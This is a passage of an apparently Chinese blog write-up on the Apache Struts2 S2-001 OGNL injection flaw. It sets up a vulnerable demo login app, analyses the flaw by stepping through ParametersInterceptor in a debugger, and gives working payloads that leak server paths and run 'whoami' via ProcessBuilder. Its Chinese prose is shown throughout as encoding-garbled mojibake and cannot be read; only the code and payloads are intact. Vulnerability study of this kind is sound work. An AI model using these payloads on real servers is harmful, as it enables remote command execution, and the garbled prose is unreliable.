‡ç­¾åº“ï¼Œç”Ÿæˆè¦å“åº”çš„å†…å®¹ã€‚ æ ¹æ®å“åº”é€†åºè°ƒç”¨æ‹¦æˆªå™¨ï¼Œç„¶åç”Ÿæˆæœ€ç»ˆçš„å“åº”å¹¶è¿”å›ç»™WebæœåŠ¡å™¨ã€‚ 0x04 æ¼æ´åˆ†æ å®˜æ–¹å…¬å‘Šï¼šhttps://cwiki.apache.org/confluence/display/WW/S2-001 æ¼æ´å½±å“èŒƒå›´ï¼šWebWork 2.2.0-WebWork 2.2.5ï¼ŒStruts 2.0.0-Struts 2.0.8 S2-001çš„æ¼æ´åŸç†æ˜¯æ¨¡æ¿æ–‡ä»¶ï¼ˆJSPï¼‰ä¸­å¼•ç”¨äº†ä¸åˆé€‚çš„æ ‡ç­¾è¿›è¡Œæ¸²æŸ“ï¼Œå¹¶ä¸”æ¸²æŸ“çš„å€¼æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œæ­¤æ—¶åˆ™è¾¾æˆäº†è¡¨è¾¾å¼æ³¨å…¥çš„ç›®çš„ã€‚ æ¼æ´ç¯å¢ƒæ­å»º Apache Tomcat/8.5.46+struts2ï¼ˆè¿™ä¸ªæ’ä»¶æœ€æ–°ç‰ˆï¼‰ é¦–å…ˆåœ¨ideaå®‰è£…Struts2æ’ä»¶ï¼ˆå®˜æ–¹è¯´2023.2ä¹‹åå°±ä¸åœ¨æ”¯æŒè¯¥æ’ä»¶ï¼Œè¿™é‡Œæˆ‘æ˜¯2023.1ç‰ˆæœ¬ï¼‰ è¿™é‡Œåœ¨æ­å»ºç¯å¢ƒä¹Ÿæ˜¯é‡åˆ°ä¼—å¤šé—®é¢˜ï¼Œå› ä¸ºç°åœ¨çš„æ–‡ç« éƒ½æ˜¯å‡ å¹´å‰çš„ï¼Œideaä¹Ÿæ˜¯è€ç‰ˆæœ¬ï¼Œå¯¹äºæˆ‘è¿™ä¸ªideaç©ä¸æ˜ç™½çš„äººï¼Œä¹Ÿæ˜¯å¾ˆè´¹åŠ²ï¼Œæœäº†ä¼—å¤šæ–‡ç« æ€»ç®—æ˜¯è§£å†³äº†ã€‚ é¦–å…ˆå¦‚ä¸Šå›¾æ‰€ç¤ºåˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®å³å¯ï¼Œæ–°ç‰ˆä¸èƒ½ç›´æ¥åˆ›å»ºJava eeï¼Œæ¥ç€åˆ›å»ºå¥½çš„é¡¹ç›®ï¼Œæ·»åŠ æŠ€æœ¯æ¡†æ¶æ”¯æŒ çº¢è‰²æ–¹æ¡†è¿™é‡Œåº”è¯¥æ˜¯æœ‰ä¸ªwebåº”ç”¨ç¨‹åºçš„ï¼ˆæˆ‘è¿™é‡Œå·²ç»æ·»åŠ è¿‡ï¼Œå› æ­¤ä¸æ˜¾ç¤ºï¼‰æ¥ç€é€‰ä¸­Struts2ï¼Œè®¾ç½®ç¨åè®¾ç½®åº“ ä¸‹è½½struts-2.0.1-allï¼Œåœ¨é¡¹ç›®ç›®å½• WEB-INF ä¸‹æ–°å»º lib æ–‡ä»¶å¤¹ï¼Œå°†æ‰€éœ€è¦çš„jaråŒ…ä»ä¸‹è½½ç›®å½•ä¸­å¯¼å…¥åˆ° lib æ–‡ä»¶å¤¹ä¸‹ï¼Œå°†å…¨éƒ¨jaråŒ…é€‰ä¸­ï¼Œå³é”® Add as Library æ‰€éœ€è¦çš„jaråŒ…å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸‹é¢çš„ç”±äºå·²ç»åˆ›å»ºè¿‡ï¼Œå°±å€Ÿç”¨ä¸ªå›¾ é€‰ä¸­ä»¥ä¸ŠjaråŒ…ï¼Œæ·»åŠ ä¸ºåº“å³å¯ï¼Œåå­—ä»»æ„ã€‚æ¥ç€åœ¨é¡¹ç›®ç»“æ„çš„å·¥ä»¶å¤„ï¼Œå°†è¯¥é¡¹ç›®è‡³äºOutput Root æœ€ååˆ›å»ºTomcat serverï¼ˆç‰ˆæœ¬åœ¨8å·¦å³å³å¯ï¼‰ï¼Œè®¾ç½®å¥½ä¹‹åï¼Œåœ¨éƒ¨ç½²é‚£ä¸€æ æ·»åŠ ç›¸åº”çš„warï¼ˆå¯èƒ½ä¸å¤Ÿè¯¦ç»†ï¼Œä¹‹åä¼šæ”¾å‚è€ƒæ–‡ç« ï¼‰ æœ€åç‚¹å‡»å³ä¸Šè§’çš„å¯åŠ¨å³å¯ï¼ŒæˆåŠŸçš„è¯ä¼šç›´æ¥è·³è½¬åˆ°ç›¸åº”urlï¼Œä½†å¦‚æœæ˜¾ç¤ºä¸æˆåŠŸï¼Œé™¤äº†ç¨‹åºæœ¬èº«çš„é…ç½®é—®é¢˜ã€‚çœ‹ä¸€ä¸‹æ˜¯å¦æ˜¯ä½¿ç”¨äº†httpsåè®®ï¼Œè¿™é‡Œæˆ‘ä»¬é»˜è®¤æ˜¯httpï¼Œå› æ­¤ä½ éœ€è¦ä¿®æ”¹ä¸ºhttpåè®® æœ€åé¡¹ç›®ç»“æ„ä»¥åŠæˆåŠŸç»“æœå¦‚ä¸‹å›¾æ‰€ç¤º å› ä¸ºæ¼æ´æ˜¯åœ¨è¡¨å•éªŒè¯å¤±è´¥æ—¶å‘ç”Ÿçš„ï¼Œè¿™é‡Œç»§ç»­ç¼–å†™ä¸€ä¸ªè¡¨å•éªŒè¯çš„Demoï¼Œä»¥å¤ç°æ¼æ´ã€‚ åœ¨ WEB ç›®å½•ä¸‹ä¿®æ”¹ index.jsp &lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt; &lt;%@ taglib prefix=\"s\" uri=\"/struts-tags\" %&gt; &lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;S2-001&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h2&gt;S2-001 Demo&lt;/h2&gt; &lt;p&gt;link: &lt;a href=\"https://cwiki.apache.org/confluence/display/WW/S2-001\"&gt;https://cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt; &lt;s:form action=\"login\"&gt; &lt;s:textfield name=\"username\" label=\"username\" /&gt; &lt;s:textfield name=\"password\" label=\"password\" /&gt; &lt;s:submit&gt;&lt;/s:submit&gt; &lt;/s:form&gt; &lt;/body&gt; &lt;/html&gt; ç„¶åæ–°å»ºwelcome.jsp &lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%&gt; &lt;%@ taglib prefix=\"s\" uri=\"/struts-tags\" %&gt; &lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;S2-001&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Hello &lt;s:property value=\"username\"&gt;&lt;/s:property&gt;&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; åœ¨ src ä¸‹æ–°å»º org.example package package org.example; import com.opensymphony.xwork2.ActionSupport; public class LoginAction extends ActionSupport { private String username = null; private String password = null; public String getUsername() { return this.username; } public String getPassword() { return this.password; } public void setUsername(String username) { this.username = username; } public void setPassword(String password) { this.password = password; } public String execute() throws Exception { if ((this.username.isEmpty()) || (this.password.isEmpty())) { return \"error\"; } if ((this.username.equalsIgnoreCase(\"admin\")) &amp;&amp; (this.password.equals(\"admin\"))) { return \"success\"; } return \"error\"; } } ä¿®æ”¹Struts.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN\" \"http://struts.apache.org/dtds/struts-2.0.dtd\"&gt; &lt;struts&gt; &lt;package name=\"S2-001\" extends=\"struts-default\"&gt; &lt;action name=\"login\" class=\"org.example.LoginAction\"&gt; &lt;result name=\"success\"&gt;welcome.jsp&lt;/result&gt; &lt;result name=\"error\"&gt;index.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt; &lt;/struts&gt; ä¹‹ååˆ·æ–°è¿è¡Œï¼ŒæˆåŠŸçš„è¯ä¼šå‡ºç°ç™»å½•demo æ¼æ´å¤ç° è·å–Tomcatè·¯å¾„ %{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"} è¿™é‡Œbpæˆ–è€…æŸ¥çœ‹æºç æ‰èƒ½çœ‹åˆ°å›æ˜¾çš„è·¯å¾„ï¼ˆæˆ–è€…ç™»å½•æ¡†ï¼‰ è·å–webç›®å½• %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()} æ‰§è¡Œå‘½ä»¤ %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"whoami\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} æ¼æ´åˆ†æ ä¸Šé¢çš„æ¼æ´å¤ç°æœ‰ä¸ªç‰¹æ€§å°±æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥é”™çš„å†…å®¹åœ¨è¾“å…¥æ¡†ï¼Œé‚£ä¼šä¿ç•™é”™è¯¯çš„ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾ å‘ç°é”™è¯¯çš„æ—¶å€™ï¼Œè¾“å…¥çš„å†…å®¹æ²¡æœ‰è¢«æ¸…ç©ºï¼Œæ¥ä¸‹æ¥è¾“%{1+1}ï¼Œå¦‚ä¸‹å›¾ï¼Œå‘ç°è¢«è§£ææˆ2 ä»è€Œåˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œå¯ä»¥æ„é€ ä¸€äº›å‘½ä»¤æ‰§è¡Œè¯­å¥ã€‚ è¯¥æ¼æ´æ˜¯å› ä¸ºç”¨æˆ·æäº¤è¡¨å•æ•°æ®å¹¶ä¸”éªŒè¯å¤±è´¥æ—¶ï¼Œåç«¯ä¼šå°†ç”¨æˆ·ä¹‹å‰æäº¤çš„å‚æ•°å€¼ä½¿ç”¨OGNL è¡¨è¾¾å¼ % {value} è¿›è¡Œè§£æï¼Œç„¶åé‡æ–°å¡«å……åˆ°å¯¹åº”çš„è¡¨å•æ•°æ®ä¸­ã€‚ æˆ‘ä»¬åœ¨OGNLè¡¨è¾¾å¼åŸç”ŸAPI getValue å¤„ä¸‹æ–­ç‚¹ï¼Œè¯¥æ–¹æ³•ç”¨äºè§£æOGNLè¡¨è¾¾å¼å¹¶è¿”å›è¡¨è¾¾å¼çš„å€¼ã€‚ åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥payloadä¹‹åï¼Œä¸æ–­æ­¥å‡ºçŸ¥é“size=2ï¼Œæ­¤æ—¶çš„è°ƒç”¨æ ˆå°±æ˜¯æ¼æ´å‘ç”Ÿçš„æ•´ä¸ªè¿‡ç¨‹ ä¸‹é¢æˆ‘ä»¬å°±æ¥é€æ­¥åˆ†æä¸€ä¸‹ï¼š é¦–å…ˆï¼Œåˆ¤æ–­%{1+1}æ˜¯åœ¨ä½•æ—¶è¢«æ‰§è¡Œçš„ï¼Œæˆ‘ä»¬å°†æ–­ç‚¹è®¾ç½®åœ¨ LoginAction çš„ setPassword å’Œ getPassword æ–¹æ³•ä¸Š ç„¶åï¼Œæ ¹æ®æœ€å¼€å§‹çš„strutså·¥ä½œæµç¨‹å›¾å¯ä»¥çŸ¥é“åœ¨ä¸€ä¸ªhttpè¯·æ±‚è¿›æ¥åï¼Œä¼šç»è¿‡ä¸€ç³»åˆ—çš„ æ‹¦æˆªå™¨ (Interceptor) ï¼Œè¿™äº›æ‹¦æˆªå™¨å¯ä»¥æ˜¯ Struts2 è‡ªå¸¦çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ã€‚ä¾‹å¦‚ struts.xmlæ–‡ä»¶ä¸­çš„ package ç»§æ‰¿è‡ª struts-default ï¼Œè€Œ struts-default å°±ä½¿ç”¨äº† Struts2 è‡ªå¸¦çš„æ‹¦æˆªå™¨ã€‚ åœ¨ struts2-core-2.0.1.jar/struts-default.xml ä¸­å¯ä»¥æ‰¾åˆ°é»˜è®¤ä½¿ç”¨çš„æ‹¦æˆªå™¨æ ˆ defaultStack åœ¨æ‹¦æˆªå™¨æ ˆdefaultStackä¸­ï¼Œ æˆ‘ä»¬éœ€è¦å…³æ³¨paramsè¿™ä¸ªæ‹¦æˆªå™¨ã€‚å…¶ä¸­ï¼Œ paramsæ‹¦æˆªå™¨ä¼šå°†å®¢æˆ·ç«¯è¯·æ±‚æ•°æ®è®¾ç½®åˆ° å€¼æ ˆ(valueStack) ä¸­ï¼Œåç»­ JSP é¡µé¢ä¸­æ‰€æœ‰çš„åŠ¨æ€æ•°æ®éƒ½å°†ä»å€¼æ ˆä¸­å–å‡ºã€‚ è¯¥æ‹¦æˆªå™¨å¯¹åº”çš„æƒé™å®šç±»åæ˜¯ com.opensymphony.xwork2.interceptor.ParametersInterceptorï¼Œè¯¥æ‹¦æˆªå™¨ä¼šé€šè¿‡è°ƒç”¨å¯¹åº” Action çš„ setter æ–¹æ³•æ¥ä¸ºå…¶å±æ€§è¿›è¡Œèµ‹å€¼ï¼›æœ€åï¼Œå¯¹èµ‹å€¼è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœ password çš„å€¼ä¸ºâ€œ%{1+1}â€ï¼Œåˆ™è¯æ˜ä»£ç æ‰§è¡Œçš„è¡Œä¸ºå‘ç”Ÿåœ¨æ‰§è¡Œ Action ä¹‹åï¼›å¦‚æœ password çš„å€¼ä¸º 2ï¼Œåˆ™è¯æ˜ä»£ç æ‰§è¡Œçš„è¡Œä¸ºå‘ç”Ÿåœ¨ Action æ‰§è¡Œä¹‹å‰ã€‚é€šè¿‡è¿™ç§ç®€å•çš„åˆ¤æ–­å°±å¯ä»¥å‡å°‘æ¼æ´ç‚¹çš„æœç´¢èŒƒå›´ï¼š å¦‚ä¸Šå›¾ï¼Œå½“æˆ‘ä»¬å‘é€payloadï¼Œå‘ç°å¤åˆ¶å®Œæˆä¹‹åã€‚passwordå€¼ä»ç„¶æ˜¯åŸå‹%{1+1}ï¼Œè¿™æ„å‘³ç€ï¼Œä»£ç æ‰§è¡Œçš„è¡Œä¸ºå‘ç”Ÿåœ¨Actionä¹‹åã€‚æ„å‘³ç€æˆªæ­¢åˆ°æ‰§è¡Œå®Œ ParametersInterceptor æ‹¦æˆªå™¨ä¸ºæ­¢ï¼Œæ²¡æœ‰ä»£ç æ‰§è¡Œçš„è¡Œä¸ºå‘ç”Ÿã€‚ æ¥ä¸‹æ¥æ˜¯æ‰§è¡Œ Action çš„ execute æ–¹æ³•ï¼Œæœ€ç»ˆç»“æœæ˜¯è¿”å›â€œerrorâ€å­—ç¬¦ä¸² æ ¹æ®Struts2æ•´ä½“æ‰§è¡Œæµç¨‹ã€‚ Actionæ‰§è¡Œå®Œæ¯•åçš„æ­¥éª¤æ˜¯æ“ä½œå¯¹åº”çš„æ¨¡æ¿é¡µé¢ï¼Œå½“LoginActionçš„executeæ–¹æ³•è¿”å›â€œerrorâ€å­—ç¬¦ä¸²æ—¶ï¼Œ Struts2è¦å»è§£æçš„æ¨¡æ¿é¡µé¢æ˜¯index.jspã€‚ Struts2 æ”¯æŒå¤šç§æ¨¡æ¿å¼•æ“(freemarkerã€jspã€utilã€velocityã€xslt)ï¼Œjsp åªæ˜¯å…¶ä¸­ä¸€ç§ã€‚æ‰€ä»¥åœ¨çœŸæ­£å¼€å§‹è§£æä¹‹å‰ï¼ŒStruts2 è¿˜éœ€è¦åˆ¤æ–­å¼€å‘äººå‘˜ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“ç§ç±»ï¼Œä»è€Œè°ƒç”¨å¯¹åº”çš„ç±»å’Œæ–¹æ³•ã€‚ è´Ÿè´£å¤„ç† JSP çš„ç±»æ˜¯ org.apache.struts2.views.jsp.ComponentTagSupportã€‚è§£æä¼šä»ç¬¬ä¸€ä¸ª Struts2 æ ‡ç­¾å³&lt;s:form action=\"Login\"&gt;å¼€å§‹ï¼Œå½“è§£æåˆ° ComponentTagSupport ç±»æ—¶ï¼Œé¦–å…ˆè¢«è°ƒç”¨çš„æ–¹æ³•å°±æ˜¯ doStartTag æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„ä»£ç å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚é™¤ doStartTag æ–¹æ³•å¤–ï¼ŒComponentTagSupport ä¸­ è¿˜æœ‰ä¸€ä¸ª doEndTag æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯è§£ææ ‡ç­¾å¼€å§‹æ—¶è°ƒç”¨ï¼Œå¦ä¸€ä¸ªæ˜¯è§£æåˆ°æ ‡ç­¾é—­åˆæ—¶è°ƒç”¨ã€‚ é—®é¢˜ä¸€ è¿™é‡Œçœ‹äº†ç½‘ä¸Šå¾ˆå¤šæ–‡ç« ï¼Œå¯èƒ½æ˜¯æˆ‘åŸºç¡€ä¸å¤ªè¡Œï¼ŒåŠ ä¸Šä¼—å¤šå¸ˆå‚…é€‰æ‹©çš„ä¾èµ–åŒ…ç‰ˆæœ¬æ˜¯struts2-core-2.0.8.jarï¼Œè€Œè¿™é‡Œæˆ‘æ˜¯struts2-core-2.0.1.jarï¼Œäºæ˜¯æ‰¾è°ƒè¯•å…¥å£ç‚¹ï¼Œå°±æ‰¾äº†åŠå¤©ï¼Œæ— ä»ä¸‹æ‰‹ã€‚è¿™é‡Œä¹Ÿæ˜¯é€‰æ‹©äº†ä¸€ç§è°ƒè¯•çš„æ–¹æ³•ï¼ˆç»“åˆå¤šä¸ªæ–‡ç« å§ï¼‰ æˆ‘ä»¬å…ˆåœ¨è‡ªå®šä¹‰çš„actionå¤„ä¸‹ä¸ªæ–­ç‚¹ï¼Œç”¨æ¥æˆªåœåˆ†ææ¥å—é¡µé¢ä¼ æ¥çš„æ•°æ® ç‚¹å‡»submitå°±ä¼šå‘ç°ä»£ç æ–­ç‚¹å¤„æ¥å—åˆ°äº†ä¼ æ¥çš„æ•°æ® ä»è¿™é‡Œå¼€å§‹ç½‘ä¸Šçš„å¾ˆå¤šæ–‡ç« å°±ç›´æ¥çœ‹è°ƒç”¨æ ˆäº†ï¼Œè¯´æ˜¯ä¸‹å›¾ä¸­çš„DefaultActionInvocationç±»ä¸­åå°„è°ƒç”¨äº†æˆ‘ä»¬è‡ªå®šä¹‰çš„ç±» LoginActionã€‚ è·¯å¾„ï¼š/xwork-2.0.3.jar!/com/opensymphony/xwork2/DefaultActionInvocation.class ä½†æˆ‘ç›´æ¥è·Ÿè¿›å´çœ‹ä¸å‡ºä¸ªæ‰€ä»¥ç„¶ï¼Œè¿™é‡Œæˆ‘è®¤ä¸ºæœ‰ä¸¤ç§åŠæ³•ï¼Œä¸€ä¸ªå°±æ˜¯ä¸€ä¸ªä¸ªç‚¹å‡»è°ƒç”¨æ ˆï¼Œå¯»æ‰¾è°è°ƒç”¨äº†LoginActionè¿™ä¸ªç±»æ–¹æ³•ï¼Œæˆ–è€…å°±æ˜¯ç›´æ¥F8è·Ÿéšçœ‹ä¸€ä¸‹å„ä¸ªå‚æ•°çš„æ•°æ®ï¼Œå¯»æ‰¾ActionLoginå…³é”®å­—ï¼Œå¦‚ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„invokeActioné¡¾åæ€ä¹‰æˆ–è€…çœ‹ä»£ç å°±èƒ½çŸ¥é“é€šè¿‡method.invokeè°ƒç”¨äº†æˆ‘ä»¬çš„è‡ªå®šä¹‰Actionç±» åŒæ—¶ä¹Ÿèƒ½çœ‹åˆ°è¿™é‡Œçš„methodå€¼æ˜¯executeæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡ŒActionç±»ä¸‹çš„executeæ–¹æ³•ã€‚ æ¥ä¸‹æ¥å¯èƒ½å°±æ˜¯é©¬åç‚®äº†ï¼Œç½‘ä¸Šçš„æ–‡ç« æ˜¯æ ¹æ®Strutsæ‰§è¡Œæµç¨‹æ¥åˆ†ææ•´æ¡é“¾å­ï¼ˆåº”è¯¥æ˜¯ç»éªŒä¸°å¯Œå¯¼è‡´çš„æ€è·¯ï¼‰ï¼Œè€Œå¯¹æˆ‘è¿™ä¸ªå°ç™½å¾ˆèŒ«ç„¶ï¼Œä½†æˆ‘ä»¬ä¸å¦¨å…ˆè·Ÿç€å¸ˆå‚…ä»¬åˆ†æä¸€ä¸‹ï¼Œéšåçœ‹çœ‹æœ‰ä»€ä¹ˆè¯¾åæ„Ÿæƒ³ã€‚ æ ¹æ®å…¶æ¡†æ¶æµç¨‹å›¾ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå½“æ¥å—äº†ä¸€ä¸ªhttpè¯·æ±‚ä¹‹åï¼Œä¼šå…ˆç»è¿‡ä¸€ç³»åˆ—æ‹¦æˆªå™¨çš„æ‰§è¡Œï¼Œé¦–å…ˆå°±æ˜¯å‚è€ƒStruts.xmlé‡Œé¢çš„ä»£ç ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå…ˆæ˜¯ç»§æ‰¿äº†ä¸€ä¸ªstruts-defaultè¿™ä¸ªStruts2è‡ªå¸¦çš„é»˜è®¤æ‹¦æˆªå™¨ï¼Œæˆ‘ä»¬æ‰¾ä¸€ä¸‹ç›¸åº”çš„æ–‡ä»¶ æ ¹æ®æ–‡ç« ä»¥åŠä¸Šé¢çš„åˆ†ææˆ‘ä»¬ä¹ŸçŸ¥é“ï¼Œè¿™é‡Œè¦å…³æ³¨çš„æ˜¯params è¿™ä¸ªæ‹¦æˆªå™¨ã€‚å…¶ä¸­ï¼Œ params æ‹¦æˆªå™¨ ä¼šå°†å®¢æˆ·ç«¯è¯·æ±‚æ•°æ®è®¾ç½®åˆ° å€¼æ ˆ(valueStack) ä¸­ åç»­ JSP é¡µé¢ä¸­æ‰€æœ‰çš„åŠ¨æ€æ•°æ®éƒ½å°†ä»å€¼æ ˆä¸­å–å‡ºã€‚é‚£è¿™ä¸€ç‚¹æˆ‘ä»¬å¦‚ä½•æ¥éªŒè¯å‘¢ï¼Œä¸‹ä¸ªæ–­ç‚¹å³å¯ è‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘æƒ³æ˜¯å› ä¸ºå‡½æ•°åç§°æ¥å®šä½çš„ï¼Œè¿™é‡Œé¡¾åæ€ä¹‰å°±æ˜¯å‚æ•°æ‹¦æˆªå™¨ï¼Œè€Œæˆ‘ä»¬æ°å¥½æ˜¯è¦æ‰¾æ‹¦æˆªå™¨ã€‚å¹¶ä¸”å…¶ä¸­çš„tryä»£ç å—ä¹Ÿæ¶‰åŠåˆ°äº†æ ˆä»¥åŠæˆ‘ä»¬è‡ªå®šä¹‰Actionçš„å‡ºç°ï¼Œæˆ‘ä»¬ä¸‹ä¸€ä¸ªæ–­ç‚¹å…ˆ å¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„å‡½æ•°å‚æ•°ä¸­å­˜åœ¨ç€passwordä¸usernameï¼Œæ˜¾ç„¶è¿™è¯æ˜äº†æˆ‘ä»¬å®¢æˆ·ç«¯å­˜å…¥çš„æ•°æ®è¢«å­˜å…¥äº†ognlçš„å€¼æ ˆä¸­ã€‚æ¥ç€æˆ‘ä»¬è·Ÿè¿›å¯¹åº”çš„setParameterså‡½æ•° whileä¸Šé¢çš„é€»è¾‘ï¼Œå…ˆæ˜¯æ­£å¸¸èµ‹ä¸ªå€¼ï¼Œorderedå€¼é»˜è®¤å°±æ˜¯falseï¼Œçœ‹ä¸€ä¸‹è¿™é‡Œçš„TreeMapï¼Œæ ¹æ®GPTå›ç­”ï¼Œè¿™ä¸ªç±»å°±æ˜¯å°†ä¼ å…¥çš„Mapç±»å¯¹è±¡parametersæŒ‰ç…§TreeMapå¯¹è±¡è‡ªèº«çš„è§„åˆ™å¯¹è¿™äº›é”®å€¼å¯¹è¿›è¡Œæ’åºï¼Œç„¶åèµ‹å€¼ç»™paramsã€‚ æ¥ç€é€šè¿‡entrySetæ–¹æ³•è·å–paramsä¸­çš„å…¨éƒ¨é”®å€¼å¯¹ è¿™é‡Œçœ‹ä¸€ä¸‹whileçš„é€»è¾‘ï¼Œé€šè¿‡ä¸Šé¢çš„iteratorè¿­ä»£å™¨è°ƒç”¨nextè·å–å½“å‰æ¡ç›®ï¼Œç„¶åå¼ºè½¬ä¸€ä¸‹ï¼Œè°ƒç”¨entryçš„getkeyè·å–å½“å‰æ¡ç›®çš„é”®ï¼Œéšåé€šè¿‡ä¸€æ¡è¯­å¥ç»™acceptableNameèµ‹å€¼ï¼Œçœ‹ä¸€ä¸‹acceptableNameé€»è¾‘ protected boolean acceptableName(String name) { return name.indexOf(61) == -1 &amp;&amp; name.indexOf(44) == -1 &amp;&amp; name.indexOf(35) == -1 &amp;&amp; name.indexOf(58) == -1; } æ ¹æ®GPTï¼Œè¿™é‡Œå°±æ˜¯åˆ¤æ–­nameçš„å€¼æ˜¯å¦å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼š å‡½æ•°å†…éƒ¨ä½¿ç”¨å¤šä¸ªindexOfæ–¹æ³•æ£€æŸ¥å­—ç¬¦ä¸²nameæ˜¯å¦åŒ…å«æŸäº›ç‰¹æ®Šå­—ç¬¦ï¼ˆASCIIç å€¼ï¼‰ï¼Œå³=ï¼ˆ61ï¼‰ã€,ï¼ˆ44ï¼‰ã€#ï¼ˆ35ï¼‰å’Œ:ï¼ˆ58ï¼‰ã€‚å¦‚æœå­—ç¬¦ä¸²nameåŒ…å«è¿™äº›ç‰¹æ®Šå­—ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œåˆ™è¯¥å‡½æ•°è¿”å›falseï¼›å¦åˆ™è¿”å›trueã€‚ å…·ä½“æ¥è¯´ï¼ŒindexOfæ–¹æ³•ç”¨äºæŸ¥æ‰¾æŒ‡å®šå­—ç¬¦ç¬¬ä¸€æ¬¡å‡ºç°åœ¨å­—ç¬¦ä¸²ä¸­çš„ä½ç½®ã€‚å¦‚æœæœªæ‰¾åˆ°è¯¥å­—ç¬¦ï¼Œåˆ™è¿”å›-1ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬æ£€æŸ¥nameä¸­æ˜¯å¦åŒ…å«ç‰¹å®šå­—ç¬¦ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±è¿”å›-1ï¼Œè¡¨ç¤ºä¸åŒ…å«è¯¥å­—ç¬¦ï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªæ£€æŸ¥ã€‚ å› æ­¤ï¼Œè¿™æ®µä»£ç å®é™…ä¸Šæ˜¯åˆ¤æ–­å­—ç¬¦ä¸²nameä¸­æ˜¯å¦åŒ…å«ç‰¹å®šå­—ç¬¦=ã€,ã€#å’Œ:ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™è¿”å›falseï¼Œå¦åˆ™è¿”å›trueã€‚ æ˜¾ç„¶è¿™é‡Œæˆ‘ä»¬çš„nameæ˜¯passwordï¼Œè¿™æ ·çš„è¯å°±èƒ½è·³å‡ºwhileå¾ªç¯ï¼Œæ¥ç€é€šè¿‡getValueå¾—åˆ°passwordçš„å€¼%{1+1}ï¼Œæœ€åè°ƒç”¨stackçš„setValueå°†æˆ‘ä»¬è¾“å…¥çš„æ•°æ®æ”¾å…¥äº†å€¼æ ˆï¼ˆè¿™é‡Œå¯ä»¥è·Ÿè¿›setValueçœ‹ä¸€ä¸‹ï¼Œå¤§ä½“å°±èƒ½çŸ¥é“ä¸ªé€»è¾‘ï¼‰ ç°åœ¨æˆ‘ä»¬å›é¡¾æœ€å¼€å§‹çš„åˆ†æï¼Œå¯ä»¥ç¡®å®šè¿™é‡Œåœ¨æœ€åå‹å…¥å€¼æ ˆçš„æ—¶å€™passwordçš„å€¼è¿˜æœªè¢«è§£æï¼Œè¿™æ„å‘³ç€è¿™æ®µä»£ç çš„è§£æè‚¯å®šæ˜¯å¤„äºè¿™äº›æ‹¦æˆªå™¨ä¹‹åçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ¼æ´ç‚¹å‘ç”Ÿåœ¨æˆ‘ä»¬è‡ªå®šä¹‰Actionæ‰§è¡Œä¹‹åï¼Œç°åœ¨æˆ‘ä»¬å°±ç†è§£äº†ä¸ºä½•ä¸Šè¿°ä¼šå»å…ˆåˆ¤æ–­æ¼æ´å‘ç”Ÿç‚¹(ä¸ç„¶èŒƒå›´å¤ªå¤§äº†)ï¼Œé‚£æ¥ä¸‹æ¥å°±æ˜¯åˆ†æActionä¹‹åçš„ä»£ç äº† å›åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„Actionï¼Œæˆ‘ä»¬çŸ¥é“æ ¹æ®æˆ‘ä»¬ä¼ 